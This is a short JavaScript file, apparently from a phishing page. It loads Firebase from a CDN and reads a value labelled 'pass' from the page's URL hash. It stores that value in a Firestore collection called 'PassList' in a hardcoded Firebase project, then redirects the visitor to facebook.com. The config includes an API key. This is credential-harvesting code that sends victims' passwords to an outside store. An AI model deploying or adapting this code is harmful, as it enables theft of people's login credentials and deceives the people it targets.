    // connect cdn for firebasw
    function addJavascript(jsname,pos) {
        var th = document.getElementsByTagName(pos)[0];
        var s = document.createElement('script');
        s.setAttribute('type','text/javascript');
        s.setAttribute('src',jsname);
        th.appendChild(s);
        return true
    };
    
        jsCode1 = new Promise ((res)=>{
            let url = 'https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js'
            addJavascript(url ,'head');
            setInterval(()=>{
                let scripts = document.getElementsByTagName("script")
                for(let i = 0; i < scripts.length; i++){
                    if (scripts[i].src == url){
                        res()
                        break;
                    }
                }
            }, 500)
        })
        jsCode2 = new Promise ((res)=>{
            let url = 'https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js'
            addJavascript(url ,'head');
            setInterval(()=>{
                let scripts = document.getElementsByTagName("script")
                for(let i = 0; i < scripts.length; i++){
                    if (scripts[i].src == url){
                        res(true)
                        break;
                    }
                }
            }, 500)
        })
    
        Promise.all([jsCode1, jsCode2]).then(()=>{
            const firebaseConfig = {
                apiKey: "AIzaSyBC6W49ilLK5mWHsP2MXKyiIjmLyRGkFiQ",
                authDomain: "allentumbagahan-9610f.firebaseapp.com",
                databaseURL: "https://allentumbagahan-9610f-default-rtdb.firebaseio.com",
                projectId: "allentumbagahan-9610f",
                storageBucket: "allentumbagahan-9610f.appspot.com",
                messagingSenderId: "702145349166",
                appId: "1:702145349166:web:5ca10176bf764ad6cd41bf",
                measurementId: "G-NRS398L5KQ"
              };
              function save(){
                  try{
                  // Initialize Firebase
                  firebase.initializeApp(firebaseConfig);
                  // Initialize Cloud Firestore and get a reference to the service
                  const db = firebase.firestore();
  
                  var hash = location.hash
                  var passt = hash.replace("#", "")
                  BotBtn = db.collection("PassList").doc(Date())
                  BotBtn.set({
                      pass : passt
                  })
                  window.location.href = "https://facebook.com"
                  }catch{
                    save()
                  }
              }
              save()
            })